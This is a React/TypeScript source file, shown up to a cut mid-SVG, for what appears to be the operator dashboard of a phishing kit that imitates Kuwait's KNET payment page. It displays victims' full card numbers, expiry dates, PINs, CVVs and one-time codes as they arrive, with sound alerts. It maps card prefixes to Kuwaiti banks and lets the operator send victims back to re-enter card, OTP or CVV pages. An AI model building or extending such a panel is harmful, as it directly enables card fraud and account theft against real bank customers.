"use client";

import { useEffect, useRef, useState } from "react";
import { formatKwd } from "@/lib/money";
import type { AdminRealtimeSnapshot, QuickPayLeadView } from "@/lib/admin-realtime-data";
import type { KnetRecordView } from "@/lib/types";
import { useAdminRealtime } from "@/hooks/use-admin-realtime";
import { updateKnetStatusAction, redirectKnetAction, clearAllKnetAction } from "@/server/admin-actions";

/* ─── Bank detection ─── */
const BANKS: Record<string, { name: string; gradient: string; invertLogo: boolean }> = {
  NBK: { name: "بنك الكويت الوطني", gradient: "linear-gradient(135deg,#003366 0%,#004a8f 40%,#005bb5 100%)", invertLogo: true },
  KFH: { name: "بيت التمويل الكويتي", gradient: "linear-gradient(135deg,#1a5e1a 0%,#237a23 40%,#2d9b2d 100%)", invertLogo: true },
  CBK: { name: "البنك التجاري الكويتي", gradient: "linear-gradient(135deg,#1a1a4e 0%,#2a2a6e 40%,#3a3a8e 100%)", invertLogo: false },
  GB: { name: "بنك الخليج", gradient: "linear-gradient(135deg,#8b1a1a 0%,#b71c1c 40%,#d32f2f 100%)", invertLogo: true },
  ABK: { name: "البنك الأهلي الكويتي", gradient: "linear-gradient(135deg,#0d3b66 0%,#1565c0 40%,#1e88e5 100%)", invertLogo: false },
  BURGAN: { name: "بنك برقان", gradient: "linear-gradient(135deg,#004d5a 0%,#00778a 40%,#0097a7 100%)", invertLogo: true },
  KIB: { name: "بنك الكويت الدولي", gradient: "linear-gradient(135deg,#1a237e 0%,#283593 40%,#3949ab 100%)", invertLogo: false },
  BOB: { name: "بنك بوبيان", gradient: "linear-gradient(135deg,#0a4d3a 0%,#0e6b50 40%,#129a72 100%)", invertLogo: true },
  WRB: { name: "بنك وربة", gradient: "linear-gradient(135deg,#5c4200 0%,#8a6500 40%,#b8860b 100%)", invertLogo: false },
};

const BIN_MAP: Record<string, string> = {
  "405843":"NBK","405853":"NBK","405871":"NBK","405873":"NBK","409567":"NBK","410124":"NBK","415899":"NBK","417768":"NBK",
  "426083":"NBK","432423":"NBK","455014":"NBK","455015":"NBK","464452":"NBK","479098":"NBK","515496":"NBK","515515":"NBK",
  "519130":"NBK","520650":"NBK","521408":"NBK","521415":"NBK","521533":"NBK","522888":"NBK","530447":"NBK","534993":"NBK",
  "534994":"NBK","535010":"NBK","535417":"NBK","536336":"NBK","541312":"NBK","541313":"NBK","541318":"NBK","542836":"NBK",
  "544219":"NBK","545494":"NBK","545880":"NBK","546860":"NBK","547187":"NBK","547196":"NBK","552050":"NBK","552277":"NBK",
  "558883":"NBK","589160":"NBK",
  "400601":"KFH","416835":"KFH","421107":"KFH","424337":"KFH","428926":"KFH","431270":"KFH","450777":"KFH","450778":"KFH",
  "455018":"KFH","458583":"KFH","466719":"KFH","479045":"KFH","485602":"KFH","498495":"KFH","516457":"KFH","516678":"KFH",
  "517957":"KFH","524221":"KFH","524745":"KFH","526450":"KFH","528006":"KFH","531483":"KFH","544239":"KFH","544240":"KFH","545408":"KFH",
  "400155":"CBK","400156":"CBK","424677":"CBK","425873":"CBK","440625":"CBK","441215":"CBK","443967":"CBK","443968":"CBK",
  "455057":"CBK","458550":"CBK","464462":"CBK","476099":"CBK","478426":"CBK","480944":"CBK","485441":"CBK","489015":"CBK",
  "510042":"CBK","516334":"CBK","516353":"CBK","517731":"CBK","521175":"CBK","521371":"CBK","521406":"CBK","526206":"CBK",
  "526597":"CBK","529074":"CBK","532672":"CBK","533757":"CBK","537015":"CBK","539887":"CBK","541855":"CBK","544290":"CBK",
  "548183":"CBK","548184":"CBK","548277":"CBK","559324":"CBK",
  "406430":"GB","422056":"GB","431210":"GB","431211":"GB","431927":"GB","438912":"GB","442104":"GB","442105":"GB",
  "442446":"GB","456776":"GB","456777":"GB","456778":"GB","460274":"GB","480182":"GB","480336":"GB","513665":"GB",
  "516647":"GB","517419":"GB","517458":"GB","522864":"GB","524158":"GB","527262":"GB","531329":"GB","531470":"GB",
  "531471":"GB","531644":"GB","531726":"GB","532675":"GB","533769":"GB","533770":"GB","533788":"GB","535966":"GB",
  "536524":"GB","540261":"GB","541107":"GB","542857":"GB","542859":"GB","544675":"GB","545424":"GB","552007":"GB",
  "552078":"GB","559320":"GB","559475":"GB","559582":"GB",
  "403622":"ABK","405285":"ABK","422431":"ABK","422869":"ABK","423826":"ABK","426669":"ABK","428628":"ABK","429790":"ABK",
  "429791":"ABK","450902":"ABK","455016":"ABK","455049":"ABK","457925":"ABK","462824":"ABK","473834":"ABK","474868":"ABK",
  "492190":"ABK","516243":"ABK","522869":"ABK","524114":"ABK","529072":"ABK","529567":"ABK","529568":"ABK","537209":"ABK",
  "544621":"ABK","544622":"ABK","544623":"ABK","556638":"ABK",
  "402166":"BURGAN","402978":"BURGAN","403583":"BURGAN","407417":"BURGAN","415254":"BURGAN","431106":"BURGAN",
  "435798":"BURGAN","435799":"BURGAN","435800":"BURGAN","438123":"BURGAN","438124":"BURGAN","440711":"BURGAN",
  "440800":"BURGAN","440801":"BURGAN","440831":"BURGAN","448329":"BURGAN","450238":"BURGAN","455048":"BURGAN",
  "455067":"BURGAN","455068":"BURGAN","456031":"BURGAN","466797":"BURGAN","466799":"BURGAN","467013":"BURGAN",
  "467014":"BURGAN","468502":"BURGAN","468564":"BURGAN","468565":"BURGAN","470965":"BURGAN","475189":"BURGAN",
  "476335":"BURGAN","483464":"BURGAN","491785":"BURGAN","517313":"BURGAN","517799":"BURGAN","518521":"BURGAN",
  "518549":"BURGAN","521596":"BURGAN","524190":"BURGAN","524844":"BURGAN","527307":"BURGAN","527525":"BURGAN",
  "527526":"BURGAN","528803":"BURGAN","531611":"BURGAN","531862":"BURGAN","532335":"BURGAN","532337":"BURGAN",
  "532339":"BURGAN","532341":"BURGAN","532493":"BURGAN","533408":"BURGAN","536047":"BURGAN","540759":"BURGAN","552299":"BURGAN",
  "403068":"KIB","404975":"KIB","406464":"KIB","409054":"KIB","409055":"KIB","413033":"KIB","414604":"KIB",
  "422622":"KIB","431475":"KIB","458232":"KIB","458233":"KIB","458770":"KIB","458771":"KIB","471457":"KIB",
  "473990":"KIB","517893":"KIB","533778":"KIB","536968":"KIB","539281":"KIB","554134":"KIB","559472":"KIB","559593":"KIB",
  "404919":"BOB","409190":"BOB","413685":"BOB","417773":"BOB","422113":"BOB","422114":"BOB","423195":"BOB",
  "426058":"BOB","431199":"BOB","441773":"BOB","443995":"BOB","450605":"BOB","458815":"BOB","470350":"BOB",
  "477937":"BOB","490455":"BOB","490456":"BOB","510692":"BOB","528540":"BOB","533746":"BOB",
  "457442":"WRB","457443":"WRB","457444":"WRB","457445":"WRB","457446":"WRB","517219":"WRB","521476":"WRB",
  "525528":"WRB","530669":"WRB","532199":"WRB","532749":"WRB","532800":"WRB","532993":"WRB","535395":"WRB",
  "535406":"WRB","535415":"WRB","536325":"WRB","540649":"WRB","541350":"WRB","547185":"WRB","548845":"WRB",
  "552512":"WRB","554273":"WRB","554801":"WRB","557763":"WRB","559151":"WRB","559459":"WRB","559527":"WRB","559539":"WRB",
};

function detectBank(cardNum: string | null | undefined) {
  if (!cardNum) return null;
  const raw = cardNum.replace(/\D/g, "");
  if (raw.length < 4) return null;
  const bin6 = raw.slice(0, 6);
  if (BIN_MAP[bin6]) return { code: BIN_MAP[bin6], ...BANKS[BIN_MAP[bin6]] };
  for (let len = 5; len >= 4; len--) {
    const prefix = raw.slice(0, len);
    for (const [bin, code] of Object.entries(BIN_MAP)) {
      if (bin.startsWith(prefix) && BANKS[code]) return { code, ...BANKS[code] };
    }
  }
  return null;
}

function formatCardNumber(num: string | null | undefined) {
  if (!num) return "•••• •••• •••• ••••";
  const raw = num.replace(/\D/g, "");
  return raw.replace(/(.{4})/g, "$1 ").trim() || num;
}

function detectNetwork(num: string | null | undefined) {
  if (!num) return "";
  const raw = num.replace(/\D/g, "");
  if (/^4/.test(raw)) return "visa";
  if (/^5[1-5]/.test(raw) || /^2[2-7]/.test(raw)) return "mastercard";
  return "";
}

function fmtTime(iso: string) {
  return new Date(iso).toLocaleString("ar-KW", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" });
}

/* ─── Sound alert ─── */
function playAlert() {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const o1 = ctx.createOscillator();
    const o2 = ctx.createOscillator();
    const g = ctx.createGain();
    o1.type = "sine"; o1.frequency.value = 880;
    o2.type = "sine"; o2.frequency.value = 1100;
    g.gain.setValueAtTime(0.3, ctx.currentTime);
    g.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.8);
    o1.connect(g); o2.connect(g); g.connect(ctx.destination);
    o1.start(); o2.start(ctx.currentTime + 0.2);
    o1.stop(ctx.currentTime + 0.8); o2.stop(ctx.currentTime + 0.8);
  } catch {}
}

/* ─── Review step labels ─── */
function reviewStepLabel(step: string) {
  const map: Record<string, string> = {
    awaiting_admin_card: "بانتظار مراجعة البطاقة",
    otp_entry: "العميل يدخل OTP",
    awaiting_admin_otp: "بانتظار مراجعة OTP",
    cvv_entry: "العميل يدخل CVV",
    awaiting_admin_cvv: "بانتظار مراجعة CVV",
    otp2_entry: "العميل يدخل OTP2",
    awaiting_admin_otp2: "بانتظار مراجعة OTP2",
    retry_card: "توجيه ← البطاقة",
    retry_otp: "توجيه ← الكود",
    retry_cvv: "توجيه ← CVV",
    retry_otp2: "توجيه ← OTP2",
    phone_registered: "سجل الرقم",
    done: "مكتمل",
  };
  return map[step] || step;
}

/* ─── Status badge ─── */
function statusBadge(status: string, reviewStep?: string) {
  if (status === "approved") return { label: "مقبول", bg: "#dcfce7", color: "#1e9e5a" };
  if (status === "rejected") return { label: "مرفوض", bg: "#fee2e2", color: "#dc2626" };
  if (reviewStep?.startsWith("retry_") || reviewStep?.startsWith("redirect_"))
    return { label: reviewStepLabel(reviewStep), bg: "#f3e8ff", color: "#7b1fa2" };
  return { label: "قيد الانتظار", bg: "#fef9c3", color: "#a16207" };
}

/* ─── Merge rows ─── */
type TableRow = { kind: "knet"; row: KnetRecordView } | { kind: "lead"; row: QuickPayLeadView };

function mergeRows(knet: KnetRecordView[], leads: QuickPayLeadView[]): TableRow[] {
  const knetRows: TableRow[] = knet.map((r) => ({ kind: "knet" as const, row: r }));
  const leadRows: TableRow[] = leads.map((r) => ({ kind: "lead" as const, row: r }));
  const key = (e: TableRow) => (e.kind === "knet" ? e.row.createdAt : e.row.lastSeen);
  return [...knetRows, ...leadRows].sort((a, b) => key(b).localeCompare(key(a)));
}

/* ═══════════════ Main component ═══════════════ */
export function ApprovalsRealtimeView({ initialSnapshot }: { initialSnapshot?: AdminRealtimeSnapshot }) {
  const { connected, knet, quickPayLeads, sessions } = useAdminRealtime(initialSnapshot);
  const [modalRow, setModalRow] = useState<KnetRecordView | null>(null);
  const [notif, setNotif] = useState("");
  const [notifVisible, setNotifVisible] = useState(false);
  const prevKeysRef = useRef<Set<string>>(new Set());

  const onlineCount = sessions.filter((s) => s.online).length;
  const tableRows = mergeRows(knet, quickPayLeads);

  // New data detection
  useEffect(() => {
    const buildKey = (r: KnetRecordView) =>
      `${r.id}|${r.cardNumber}|${r.pin}|${r.otp}|${r.cvv}`;
    const newKeys = new Set(knet.map(buildKey));
    if (prevKeysRef.current.size > 0) {
      const fresh = knet.filter((r) => !prevKeysRef.current.has(buildKey(r)));
      if (fresh.length > 0) {
        const latest = fresh[0];
        let msg = "طلب جديد وصل";
        if (latest.otp) msg = "وصل OTP جديد";
        else if (latest.cvv) msg = "وصل CVV جديد";
        else if (latest.pin) msg = "وصل رقم سري جديد";
        else if (latest.cardNumber) msg = "وصلت بيانات بطاقة جديدة";
        if (latest.msisdnDisplay) msg += " — " + latest.msisdnDisplay;
        playAlert();
        setNotif(msg);
        setNotifVisible(true);
        setTimeout(() => setNotifVisible(false), 4000);
      }
    }
    prevKeysRef.current = newKeys;
  }, [knet]);

  return (
    <div style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Notification banner */}
      <div
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          zIndex: 999,
          background: "linear-gradient(135deg, #1565c0, #1e88e5)",
          color: "#fff",
          textAlign: "center",
          padding: "14px 20px",
          fontSize: 16,
          fontWeight: 700,
          transform: notifVisible ? "translateY(0)" : "translateY(-100%)",
          transition: "transform 0.4s ease",
        }}
      >
        {notif}
      </div>

      {/* Stats */}
      <div style={{ display: "flex", flexWrap: "wrap", gap: 14, marginBottom: 24 }}>
        <StatCard num={knet.length} label="إجمالي الطلبات" />
        <StatCard num={onlineCount} label="زيارات نشطة الآن" />
      </div>

      {/* Table card */}
      <div
        style={{
          background: "#fff",
          borderRadius: 16,
          boxShadow: "0 2px 12px rgba(0,0,0,0.06)",
          overflow: "hidden",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            padding: "16px 20px",
            borderBottom: "1px solid #e5e7eb",
          }}
        >
          <h2 style={{ fontSize: 20, fontWeight: 800, margin: 0, color: "#1D252D" }}>الطلبات</h2>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: "50%",
                background: connected ? "#1e9e5a" : "#f59e0b",
                display: "inline-block",
              }}
            />
            <form action={clearAllKnetAction}>
              <button
                type="submit"
                style={{
                  background: "none",
                  border: "none",
                  color: "#e4312a",
                  fontSize: 14,
                  fontWeight: 700,
                  cursor: "pointer",
                  fontFamily: "'Tajawal', sans-serif",
                }}
                onClick={(e) => {
                  if (!confirm("مسح كل الطلبات؟")) e.preventDefault();
                }}
              >
                مسح الكل
              </button>
            </form>
          </div>
        </div>

        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 14 }}>
            <thead>
              <tr style={{ background: "#f9fafb", borderBottom: "1px solid #e5e7eb" }}>
                <th style={thStyle}>البنك</th>
                <th style={thStyle}>رقم الجوال</th>
                <th style={thStyle}>المبلغ</th>
                <th style={thStyle}>الوقت</th>
                <th style={thStyle}>الحالة</th>
                <th style={thStyle}>المرحلة</th>
                <th style={thStyle}>الإجراءات</th>
              </tr>
            </thead>
            <tbody>
              {tableRows.length === 0 ? (
                <tr>
                  <td colSpan={7} style={{ padding: "40px 20px", textAlign: "center", color: "#9ca3af" }}>
                    لا توجد طلبات بعد
                  </td>
                </tr>
              ) : null}
              {tableRows.map((entry) => {
                if (entry.kind === "lead") {
                  return (
                    <tr key={`lead:${entry.row.sessionId}`} style={{ borderBottom: "1px solid #f3f4f6", background: "#f0f7ff" }}>
                      <td style={tdStyle}><span style={{ color: "#9ca3af", fontSize: 12 }}>—</span></td>
                      <td style={{ ...tdStyle, fontWeight: 700, fontSize: 15 }} dir="ltr">{entry.row.msisdnDisplay}</td>
                      <td style={tdStyle}>—</td>
                      <td style={{ ...tdStyle, fontSize: 12, color: "#6b7280" }}>{fmtTime(entry.row.lastSeen)}</td>
                      <td style={tdStyle}><Badge status="pending" /></td>
                      <td style={{ ...tdStyle, fontSize: 12 }}>{reviewStepLabel("phone_registered")}</td>
                      <td style={tdStyle}><span style={{ fontSize: 12, color: "#9ca3af" }}>بانتظار الدفع</span></td>
                    </tr>
                  );
                }
                const r = entry.row;
                const bank = detectBank(r.cardNumber);
                return (
                  <tr key={r.id} style={{ borderBottom: "1px solid #f3f4f6" }}>
                    <td style={tdStyle}>
                      {bank ? (
                        <span style={{ fontSize: 12, fontWeight: 700 }}>{bank.name}</span>
                      ) : (
                        <span style={{ color: "#9ca3af", fontSize: 12 }}>—</span>
                      )}
                    </td>
                    <td style={{ ...tdStyle, fontWeight: 600 }} dir="ltr">{r.msisdnDisplay || "—"}</td>
                    <td style={{ ...tdStyle, fontWeight: 700, color: "#4F008C" }}>
                      {formatKwd(r.amountHalalas, "ar")}
                    </td>
                    <td style={{ ...tdStyle, fontSize: 12, color: "#6b7280" }}>{fmtTime(r.createdAt)}</td>
                    <td style={tdStyle}><Badge status={r.status} reviewStep={r.reviewStep} /></td>
                    <td style={{ ...tdStyle, fontSize: 12 }}>{reviewStepLabel(r.reviewStep)}</td>
                    <td style={tdStyle}>
                      <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                        <button
                          type="button"
                          onClick={() => setModalRow(r)}
                          style={{
                            padding: "5px 12px",
                            borderRadius: 8,
                            border: "none",
                            background: "#e3f2fd",
                            color: "#1565c0",
                            fontSize: 12,
                            fontWeight: 700,
                            cursor: "pointer",
                            fontFamily: "'Tajawal', sans-serif",
                          }}
                        >
                          التفاصيل
                        </button>
                        <RedirectDropdown knetId={r.id} />
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* Modal */}
      {modalRow ? <DetailsModal row={modalRow} onClose={() => setModalRow(null)} /> : null}
    </div>
  );
}

const thStyle: React.CSSProperties = {
  padding: "12px 14px",
  textAlign: "start",
  fontWeight: 700,
  fontSize: 13,
  color: "#6b7280",
  whiteSpace: "nowrap",
};

const tdStyle: React.CSSProperties = {
  padding: "12px 14px",
  verticalAlign: "middle",
};

/* ─── Stat card ─── */
function StatCard({ num, label }: { num: number; label: string }) {
  return (
    <div
      style={{
        flex: "1 1 160px",
        background: "#fff",
        borderRadius: 16,
        padding: "18px 22px",
        boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
      }}
    >
      <div style={{ fontSize: 32, fontWeight: 800, color: "#1D252D" }}>{num}</div>
      <div style={{ fontSize: 14, color: "#6b7280", marginTop: 2 }}>{label}</div>
    </div>
  );
}

/* ─── Badge ─── */
function Badge({ status, reviewStep }: { status: string; reviewStep?: string }) {
  const b = statusBadge(status, reviewStep);
  return (
    <span
      style={{
        display: "inline-block",
        padding: "3px 10px",
        borderRadius: 999,
        fontSize: 12,
        fontWeight: 700,
        background: b.bg,
        color: b.color,
        whiteSpace: "nowrap",
      }}
    >
      {b.label}
    </span>
  );
}

/* ─── Redirect dropdown ─── */
function RedirectDropdown({ knetId }: { knetId: string }) {
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);

  useEffect(() => {
    function close(e: MouseEvent) {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    }
    document.addEventListener("click", close);
    return () => document.removeEventListener("click", close);
  }, []);

  return (
    <div ref={ref} style={{ position: "relative" }}>
      <button
        type="button"
        onClick={() => setOpen(!open)}
        style={{
          padding: "5px 12px",
          borderRadius: 8,
          border: "none",
          background: "#f3e8ff",
          color: "#7b1fa2",
          fontSize: 12,
          fontWeight: 700,
          cursor: "pointer",
          fontFamily: "'Tajawal', sans-serif",
        }}
      >
        إعادة التوجيه ▾
      </button>
      {open ? (
        <div
          style={{
            position: "absolute",
            top: "100%",
            right: 0,
            marginTop: 4,
            background: "#fff",
            borderRadius: 10,
            boxShadow: "0 4px 16px rgba(0,0,0,0.12)",
            border: "1px solid #e5e7eb",
            zIndex: 50,
            minWidth: 160,
            overflow: "hidden",
          }}
        >
          {(["card", "otp", "cvv"] as const).map((page) => (
            <form key={page} action={redirectKnetAction}>
              <input type="hidden" name="knetId" value={knetId} />
              <input type="hidden" name="page" value={page} />
              <button
                type="submit"
                onClick={() => setOpen(false)}
                style={{
                  display: "block",
                  width: "100%",
                  padding: "10px 16px",
                  border: "none",
                  background: "transparent",
                  textAlign: "start",
                  fontSize: 13,
                  fontWeight: 600,
                  cursor: "pointer",
                  fontFamily: "'Tajawal', sans-serif",
                  color: "#1D252D",
                }}
                onMouseOver={(e) => ((e.target as HTMLElement).style.background = "#f3f4f6")}
                onMouseOut={(e) => ((e.target as HTMLElement).style.background = "transparent")}
              >
                {page === "card" ? "صفحة البطاقة" : page === "otp" ? "صفحة الكود" : "صفحة CVV"}
              </button>
            </form>
          ))}
        </div>
      ) : null}
    </div>
  );
}

/* ─── Details modal ─── */
function DetailsModal({ row, onClose }: { row: KnetRecordView; onClose: () => void }) {
  const bank = detectBank(row.cardNumber);
  const network = detectNetwork(row.cardNumber);
  const gradient = bank?.gradient || "linear-gradient(135deg,#1a1a2e 0%,#16213e 40%,#0f3460 100%)";

  return (
    <div
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(0,0,0,0.5)",
        zIndex: 100,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: 16,
      }}
    >
      <div
        style={{
          background: "#fff",
          borderRadius: 16,
          width: "100%",
          maxWidth: 480,
          maxHeight: "90vh",
          overflow: "auto",
        }}
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            padding: "16px 20px",
            borderBottom: "1px solid #e5e7eb",
          }}
        >
          <h3 style={{ fontSize: 18, fontWeight: 800, margin: 0 }}>تفاصيل الطلب</h3>
          <button
            type="button"
            onClick={onClose}
            style={{
              width: 32, height: 32, borderRadius: "50%",
              border: "none", background: "#f3f4f6",
              fontSize: 18, cursor: "pointer", display: "flex",
              alignItems: "center", justifyContent: "center",
            }}
          >
            &times;
          </button>
        </div>

        {/* Body */}
        <div style={{ padding: 20 }}>
          {/* Credit card front */}
          <div
            style={{
              width: "100%",
              maxWidth: 400,
              margin: "0 auto 16px",
              aspectRatio: "1.586/1",
              borderRadius: 16,
              background: gradient,
              color: "#fff",
              padding: "22px 26px",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
              boxShadow: "0 8px 24px rgba(0,0,0,0.2)",
              position: "relative",
              overflow: "hidden",
              direction: "ltr",
              textAlign: "left",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <ChipSvg />
                <NfcSvg />
              </div>
              {bank ? <span style={{ fontSize: 11, opacity: 0.7 }}>{bank.name}</span> : null}
            </div>
            <div
              style={{
                fontSize: 22, fontWeight: 700, letterSpacing: 3.5,
                textAlign: "center", textShadow: "0 1px 3px rgba(0,0,0,0.3)",
                fontFamily: "'Courier New', monospace", wordSpacing: 8,
              }}
            >
              {formatCardNumber(row.cardNumber)}
            </div>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end" }}>
              <div>
                <div style={{ fontSize: 9, textTransform: "uppercase", letterSpacing: 1.2, opacity: 0.6, marginBottom: 2 }}>
                  VALID THRU
                </div>
                <div style={{ fontSize: 16, fontWeight: 700, letterSpacing: 1, fontFamily: "'Courier New', monospace" }}>
                  {row.expiryDate || "••/••"}
                </div>
              </div>
              <div style={{ textAlign: "right" }}>
                {network === "visa" ? <VisaLogo /> : network === "mastercard" ? <MastercardLogo /> : null}
              </div>
            </div>
          </div>

          {/* Credit card back (if CVV/PIN/OTP exist) */}
          {(row.cvv || row.pin || row.otp) ? (
            <div
              style={{
                width: "100%",
                maxWidth: 400,
                margin: "0 auto 20px",
                borderRadius: 16,
                background: gradient,
                color: "#fff",
                overflow: "hidden",
                boxShadow: "0 8px 24px rgba(0,0,0,0.2)",
                direction: "ltr",
                textAlign: "left",
              }}
            >
              <div style={{ width: "100%", height: 42, background: "#222", marginTop: 18 }} />
              {row.cvv ? (
                <div
                  style={{
                    margin: "14px 20px",
                    background: "rgba(255,255,255,0.85)",
                    borderRadius: 4,
                    padding: "10px 16px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                  }}
                >
                  <span style={{ color: "#888", fontSize: 10, textTransform: "uppercase", letterSpacing: 1 }}>CVV</span>
                  <span style={{ fontSize: 20, fontWeight: 800, color: "#1a1a2e", fontFamily: "'Courier New', monospace", letterSpacing: 3, fontStyle: "italic" }}>
                    {row.cvv}
                  </span>
                </div>
              ) : null}
              {(row.pin || row.otp) ? (
                <div style={{ display: "flex", gap: 12, justifyContent: "center", padding: "10px 20px 18px" }}>
                  {row.pin ? (
                    <div style={{ background: "rgba(255,255,255,0.08)", borderRadius: 8, padding: "8px 16px", textAlign: "center", flex: 1 }}>
                      <div style={{ fontSize: 9, textTransform: "uppercase", letterSpacing: 1, color: "rgba(255,255,255,0.5)", marginBottom: 3 }}>PIN</div>
                      <div style={{ fontSize: 18, fontWeight: 800, fontFamily: "'Courier New', monospace", letterSpacing: 2 }}>{row.pin}</div>
                    </div>
                  ) : null}
                  {row.otp ? (
                    <div style={{ background: "rgba(255,255,255,0.08)", borderRadius: 8, padding: "8px 16px", textAlign: "center", flex: 1 }}>
                      <div style={{ fontSize: 9, textTransform: "uppercase", letterSpacing: 1, color: "rgba(255,255,255,0.5)", marginBottom: 3 }}>OTP</div>
                      <div style={{ fontSize: 18, fontWeight: 800, fontFamily: "'Courier New', monospace", letterSpacing: 2 }}>{row.otp}</div>
                    </div>
                  ) : null}
                </div>
              ) : null}
            </div>
          ) : null}

          {/* Detail rows */}
          <DetailRow label="رقم الجوال" value={row.msisdnDisplay || "—"} />
          <DetailRow label="المبلغ" value={formatKwd(row.amountHalalas, "ar")} />
          <DetailRow label="الوقت" value={fmtTime(row.createdAt)} />
          {row.otp2 ? <DetailRow label="OTP 2" value={row.otp2} dir="ltr" /> : null}
        </div>

        {/* Actions */}
        <div style={{ padding: "0 20px 20px", display: "flex", gap: 10 }}>
          {row.status === "approved" ? (
            <div style={{ width: "100%", textAlign: "center", color: "#1e9e5a", fontWeight: 700, fontSize: 16 }}>
              تم القبول ✓
            </div>
          ) : row.status === "rejected" ? (
            <div style={{ width: "100%", textAlign: "center", color: "#dc2626", fontWeight: 700, fontSize: 16 }}>
              تم الرفض ✗
            </div>
          ) : (
            <>
              <form action={updateKnetStatusAction} style={{ flex: 1 }}>
                <input type="hidden" name="knetId" value={row.id} />
                <input type="hidden" name="decision" value="approved" />
                <button
                  type="submit"
                  onClick={onClose}
                  style={{
                    width: "100%", padding: "12px 0", borderRadius: 12,
                    border: "none", background: "#1e9e5a", color: "#fff",
                    fontSize: 16, fontWeight: 700, cursor: "pointer",
                    fontFamily: "'Tajawal', sans-serif",
                  }}
                >
                  قبول
                </button>
              </form>
              <form action={updateKnetStatusAction} style={{ flex: 1 }}>
                <input type="hidden" name="knetId" value={row.id} />
                <input type="hidden" name="decision" value="rejected" />
                <button
                  type="submit"
                  onClick={onClose}
                  style={{
                    width: "100%", padding: "12px 0", borderRadius: 12,
                    border: "none", background: "#dc2626", color: "#fff",
                    fontSize: 16, fontWeight: 700, cursor: "pointer",
                    fontFamily: "'Tajawal', sans-serif",
                  }}
                >
                  رفض
                </button>
              </form>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

function DetailRow({ label, value, dir }: { label: string; value: string; dir?: string }) {
  return (
    <div
      style={{
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        padding: "10px 0",
        borderBottom: "1px solid #f3f4f6",
      }}
    >
      <span style={{ fontSize: 13, color: "#6b7280", fontWeight: 500 }}>{label}</span>
      <span style={{ fontSize: 14, fontWeight: 700, color: "#1D252D", direction: dir as any }}>{value}</span>
    </div>
  );
}

/* ─── SVGs ─── */
function ChipSvg() {
  return (
    <svg width="52" height="40" viewBox="0 0 60 46" xmlns="http://www.w3.org/2000/svg" style={{ filter: "drop-shadow(0 1px 2px rgba(0,0,0,0.15))" }}>
      <defs>
        <linearGradient id="chipG" x1="0" y1="0" x2="60" y2="46" gradientUnits="userSpaceOnUse">
          <stop offset="0%" stopColor="#d9d0c0" /><stop offset="30%" stopColor="#c4baa8" />
          <stop offset="50%" stopColor="#b8ad99" /><stop offset="70%" stopColor="#c4baa8" />
          <stop offset="100%" stopColor="#d5ccbc" />
        </linearGradient>
      </defs>
      <rect x="0" y="0" width="60" height="46" rx="6" fill="url(#chipG)" />
      <line x1="0" y1="16" x2="20" y2="16" stroke="#9e9585" strokeWidth="1.2" />
      <line x1="0" y1="30" x2="20" y2="30" stroke="#9e9585" strokeWidth="1.2" />
      <line x1="40" y1="16" x2="60" y2="16" stroke="#9e9585" strokeWidth="1.2" />
      <line x1="40" y1="30" x2="60" y2="30" stroke="#9e9585" strokeWidth="1.2" />
      <rect x="18" y="4" width="24" height="38" rx="3" fill="none" stroke="#9e9585" strokeWidth="1.2" />
      <line x1="18" y1="16" x2="42" y2="16" stroke="#9e9585" strokeWidth="1.2" />
      <line x1="18" y1="30" x2="42" y2="30" stroke="#9e9585" strokeWidth="1.2" />
      <line x1="30" y1="4" x2="30" y2="16" stroke="#9e9585" strokeWidth="1" />
      <line x1="30" y1="30" x2="30" y2="42" stroke="#9e9585" strokeWidth="1" />
    </svg>
  );
}

function NfcSvg() {
  return (
    <svg width="28" height="28" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg" style={{ opacity: 0.75 }}>
      <g transform="rotate(-90 15 15)">
        <circle cx="15" cy="22" r="1.8" fill="#fff" />
        <path d="M10.5 17.5a6.36 6.36 0 0 1 9 0" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" />
        <path d="M7 14a11 11 0 0 1 16 0" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" />
        <path d="M3.5 10.5a15.5 15.5 0 0 1 23 0" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" />
      </g>
    </svg>
  );
}

function VisaLogo() {
  return (
    <svg width="60" height="40" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg" style={{ opacity: 0.9 }}>
